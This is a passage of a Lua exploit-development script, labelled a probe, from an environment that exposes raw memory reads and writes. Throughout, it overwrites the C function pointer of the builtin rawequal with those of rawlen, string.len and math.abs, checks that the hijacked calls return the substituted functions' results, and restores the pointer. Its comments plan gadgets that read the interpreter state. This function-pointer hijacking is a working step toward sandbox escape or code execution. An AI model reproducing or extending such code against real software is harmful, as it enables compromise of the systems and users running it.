    local val = safe_rq(rawequal_addr + off)
    print(string.format("  +0x%02X: %s", off, hexval(val)))

-- ============================================================
-- [F] Read the C function's first argument (lua_State*)
-- Redirect rawequal to a gadget that reads rdi and stores it.
-- Strategy: redirect to a known C function that writes its
-- lua_State* arg somewhere accessible. The tostring C function
-- calls luaL_checkstring which accesses L->top — if we redirect
-- to it we can observe its behavior.
--
-- Simpler: redirect rawequal to rawlen (lua_objlen), which
-- returns a number. The number is the length of its first arg.
-- This confirms we can get a Lua number back.
-- ============================================================
print("")
print("[F] Redirect rawequal -> rawlen (returns a number)")
local rawlen_addr = parse_func_addr(rawlen)
if rawlen_addr then
    local rawlen_20_lo = safe_rd(rawlen_addr + 0x20)
    local rawlen_20_hi = safe_rd(rawlen_addr + 0x24)
    print("  rawlen addr: " .. hexval(rawlen_addr))
    memory.write_dword(rawequal_addr + 0x20, rawlen_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawlen_20_hi)
    -- rawlen("hello") should return 5
    local f_ok, f_r1 = pcall(rawequal, "hello")
    print("  rawequal('hello') as rawlen: ok=" .. tostring(f_ok) .. " r=" .. tostring(f_r1))
    local f2_ok, f2_r1 = pcall(rawequal, "abcdefghij")
    print("  rawequal('abcdefghij') as rawlen: ok=" .. tostring(f2_ok) .. " r=" .. tostring(f2_r1))
    local f3_ok, f3_r1 = pcall(rawequal, {1,2,3,4,5})
    print("  rawequal({1..5}) as rawlen: ok=" .. tostring(f3_ok) .. " r=" .. tostring(f3_r1))
    -- Restore
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
else
    print("  rawlen not available (Lua 5.1 — try table.maxn or #)")
    -- In Lua 5.1, rawlen doesn't exist. Try pcall to string.len's C func
    local strlen_addr = parse_func_addr(string.len)
    if strlen_addr then
        local strlen_20_lo = safe_rd(strlen_addr + 0x20)
        local strlen_20_hi = safe_rd(strlen_addr + 0x24)
        print("  string.len addr: " .. hexval(strlen_addr))
        print("  string.len +0x20: " .. string.format("0x%08X_%08X", strlen_20_hi or 0, strlen_20_lo or 0))
        memory.write_dword(rawequal_addr + 0x20, strlen_20_lo)
        memory.write_dword(rawequal_addr + 0x24, strlen_20_hi)
        local f_ok, f_r1 = pcall(rawequal, "hello")
        print("  rawequal('hello') as strlen: ok=" .. tostring(f_ok) .. " r=" .. tostring(f_r1))
        local f2_ok, f2_r1 = pcall(rawequal, "abcdefghij")
        print("  rawequal('abcdefghij') as strlen: ok=" .. tostring(f2_ok) .. " r=" .. tostring(f2_r1))
        memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
        memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
        print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
    else
        print("  string.len addr not found")
    end
end

-- ============================================================
-- [G] Key experiment: redirect rawequal to math.abs's C function
-- math.abs(x) returns a number. rawequal(-42) should return 42.
-- ============================================================
print("")
print("[G] Redirect rawequal -> math.abs (returns a number)")
local abs_addr = parse_func_addr(math.abs)
if abs_addr then
    local abs_20_lo = safe_rd(abs_addr + 0x20)
    local abs_20_hi = safe_rd(abs_addr + 0x24)
    print("  math.abs addr: " .. hexval(abs_addr))
    memory.write_dword(rawequal_addr + 0x20, abs_20_lo)
    memory.write_dword(rawequal_addr + 0x24, abs_20_hi)
    local g_ok, g_r1 = pcall(rawequal, -42)
    print("  rawequal(-42) as abs: ok=" .. tostring(g_ok) .. " r=" .. tostring(g_r1))
    local g2_ok, g2_r1 = pcall(rawequal, -999.5)
    print("  rawequal(-999.5) as abs: ok=" .. tostring(g2_ok) .. " r=" .. tostring(g2_r1))
    local g3_ok, g3_r1 = pcall(rawequal, 7)
    print("  rawequal(7) as abs: ok=" .. tostring(g3_ok) .. " r=" .. tostring(g3_r1))
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
else
    print("  math.abs addr not found")
end

collectgarbage("restart")

print("")
print("=== PROBE 56f COMPLETE ===")
```
